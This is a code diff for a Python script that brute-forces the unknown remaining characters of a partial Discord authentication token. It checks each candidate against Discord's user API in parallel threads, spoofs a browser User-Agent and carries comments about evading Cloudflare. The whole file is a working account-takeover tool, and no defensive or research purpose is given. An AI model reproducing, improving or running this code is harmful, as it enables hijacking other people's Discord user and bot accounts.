@@ -1,5 +1,11 @@
 import concurrent.futures
+import random
 import sys
+import urllib
+from json import loads
+from urllib.request import Request
+
+from tqdm import tqdm
 
 HOWLONGATOKENIS = 59
 CurrentToken = input("Enter your token: ")
@@ -19,46 +25,46 @@ def generateCombos(guessLength, iteration):
     return "".join(combos)
 
 
-import discord
-from tqdm import tqdm
-import asyncio
-import random
-
 possibleChars = list(possibleChars)
 random.shuffle(possibleChars)
 possibleChars = "".join(possibleChars)
 
 
-async def validateToken(token):
-    client = discord.Client()
+def validateToken(token, bot=True):
+    if bot:
+        token = "Bot " + token
+    req = Request("https://discord.com/api/v9/users/@me", headers={
+        "Authorization": token,
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"#beware cloudflare
+    })
     try:
-        data = await client.http.static_login(token.strip(), bot=True)
-        print("\n")
-        print(f'{token} is a valid token!, username: {data["username"]}#{data["discriminator"]}')
-        await client.close()
-        return token
-    except:
+        response = urllib.request.urlopen(req)
+        # json to dict
+        body = response.read().decode("utf-8")
+        data = loads(body)
+        if bot:
+            token = token[4:]
+        data["token"] = token
+        if response.code == 200:
+            return data
+    except Exception as e:
         pass
-    await client.close()
+    return None
 
-
-def validateWrapper(args):
-    return asyncio.run(validateToken(args))
-
-
-async def goooooooo():
+def main():
     futures = []
-    executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)
+    executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)#beware cloudflare
     for i in range(totalCombos):
         combos = generateCombos(guessLength, i)
         combos = CurrentToken + combos
-        futures.append(executor.submit(validateWrapper, combos))
+        futures.append(executor.submit(validateToken, combos))
 
     with tqdm(total=totalCombos) as pbar:
         for future in concurrent.futures.as_completed(futures):
             try:
                 data = future.result()
                 if data:
+                    print(f'Found token: {data["token"]}, {data["username"]}#{data["discriminator"]}')
                     pbar.update(totalCombos - pbar.n)
                     pbar.close()
                     sys.exit(0)
@@ -66,7 +72,7 @@ async def goooooooo():
             except:
                 pass
             pbar.update(1)
-        await asyncio.sleep(0.1)
 
 
-asyncio.get_event_loop().run_until_complete(goooooooo())
+if __name__ == '__main__':
+    main()
